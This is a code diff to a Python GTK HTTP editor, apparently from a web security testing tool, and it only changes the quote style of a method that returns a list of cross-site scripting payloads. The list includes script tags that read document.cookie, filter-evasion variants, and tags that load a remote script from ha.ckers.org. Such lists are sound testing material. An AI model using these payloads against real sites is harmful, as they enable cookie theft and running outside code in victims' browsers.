@@ -95,17 +95,17 @@ class HttpEditor(gtk.VBox, Searchable):
         return l.get_id()
 
     def get_string_payloads(self):
-        '''Give the list of payloads.
+        """Give the list of payloads.
         Taken from: http://ha.ckers.org/xss.html
-        '''
+        """
         return [
             '";!--\'<XSS>=&{()}\\xss<script>alert(document.cookie)</script>',
-            '''';alert(String.fromCharCode(88,83,83))//\\\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>''',
+            """';alert(String.fromCharCode(88,83,83))//\\\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>""",
             '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
             '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
             '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
             '<<SCRIPT>alert("XSS");//<</SCRIPT>',
-            '''<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>''',
+            """<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>""",
             '\\";alert(\'XSS\');//'
         ]
 
